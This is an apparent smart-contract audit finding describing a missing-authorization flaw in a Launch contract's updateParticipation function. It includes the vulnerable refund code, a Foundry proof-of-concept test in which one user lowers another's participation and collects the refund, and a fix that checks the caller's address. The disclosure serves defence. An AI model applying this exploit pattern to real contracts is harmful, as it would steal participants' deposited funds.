# Unauthorized Participation Update Leading to Funds Lost

## Finding description and impact

The `updateParticipation` function in the Launch contract contains a critical vulnerability that allows any user to modify another user's participation and potentially steal their deposited funds by exploiting the refund mechanism.
The Launch contract provides functionality for users to update their participation amounts in token launches, either increasing or decreasing their committed funds. When a user decreases their participation amount, the contract sends a refund for the difference. However, the contract fails to verify that the person requesting the update is the original participant, only validating the userId matches.
This vulnerability stems from the contract sending refunds to msg.sender without verifying it matches the original participant's address:

```solidity
if (prevInfo.currencyAmount > newCurrencyAmount) {
    uint256 refundCurrencyAmount = prevInfo.currencyAmount - newCurrencyAmount;
    // Vulnerable: Sends refund to msg.sender without verification
    IERC20(request.currency).safeTransfer(msg.sender, refundCurrencyAmount);
}
```

## Proof of Concept

The vulnerability allows malicious users to:

  1. Update any participant's allocation to a lower amount
  2. Receive the difference as a refund to their own address
  3. Effectively steal funds from legitimate participants

Add this test to `LaunchUpdateParticipationTest` contract:

```solidity
 function testUnauthorizedUpdateParticipation() public {
        // Setup launch group with non-finalizing participation
        bytes32 launchGroupId = bytes32(uint256(1));
        LaunchGroupSettings memory settings1 = _setupLaunchGroupWithStatus(launchGroupId, LaunchGroupStatus.PENDING);
        settings1.finalizesAtParticipation = false;
        settings1.status = LaunchGroupStatus.ACTIVE;

        vm.startPrank(manager);
        launch.setLaunchGroupSettings(launchGroupId, settings1);
        vm.stopPrank();

        // User1 makes initial participation
        bytes32 user1ParticipationId = bytes32("user1Participation");
        ParticipationRequest memory initialRequest = _createParticipationRequest();
        initialRequest.launchGroupId = launchGroupId;
        initialRequest.launchParticipationId = user1ParticipationId;
        initialRequest.tokenAmount = 1000 * 10 ** launch.tokenDecimals();
        bytes memory initialSignature = _signRequest(abi.encode(initialRequest));

        vm.startPrank(user1);
        currency.approve(
            address(launch), _getCurrencyAmount(launchGroupId, initialRequest.currency, initialRequest.tokenAmount)
        );
        launch.participate(initialRequest, initialSignature);
        vm.stopPrank();

        // User2 attempts to update User1's participation to get refund
        vm.startPrank(user2);
        UpdateParticipationRequest memory attackRequest = _createUpdateParticipationRequest(500); // Lower amount to trigger refund
        attackRequest.launchGroupId = launchGroupId;
        attackRequest.prevLaunchParticipationId = user1ParticipationId; // Reference User1's participation
        attackRequest.newLaunchParticipationId = bytes32("attacker_participation"); // New unique ID
        attackRequest.userAddress = user2; // Attacker's address

        // Record initial balances
        uint256 user2InitialBalance = currency.balanceOf(user2);

        // Sign and execute attack
        bytes memory attackSignature = _signRequest(abi.encode(attackRequest));

        launch.updateParticipation(attackRequest, attackSignature);

        // Verify User2 (attacker) received refund
        assertGt(currency.balanceOf(user2), user2InitialBalance);
        vm.stopPrank();
    }
```

## Recommended mitigation steps

Add address validation at the start of the `updateParticipation` function:

```solidity
    // Add address validation
    if (msg.sender != prevInfo.userAddress) {
        revert UnauthorizedUpdate();
    }

```
